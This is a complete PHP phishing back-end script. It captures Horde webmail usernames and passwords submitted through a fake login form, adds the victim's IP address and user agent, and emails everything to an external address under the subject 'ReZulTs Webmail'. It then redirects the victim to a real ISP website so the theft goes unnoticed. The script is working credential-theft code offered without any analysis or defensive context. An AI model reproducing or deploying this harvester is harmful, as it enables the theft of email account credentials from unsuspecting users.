<?
$ip = getenv("REMOTE_ADDR");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------FLAG-Log--------------\n";
$message .= "username: ".$_POST['horde_user']."\n";
$message .= "password: ".$_POST['horde_pass']."\n";
$message .= "IP: ".$ip."\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "-----------Done-By-Pythonk--------\n";
$send = "chigoshegzy34@aol.com";
$subject = "ReZulTs Webmail";
$headers = "From: Netl0gs<bdtrophrecruiter@gmail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location:  http://www.dca.net/");

?>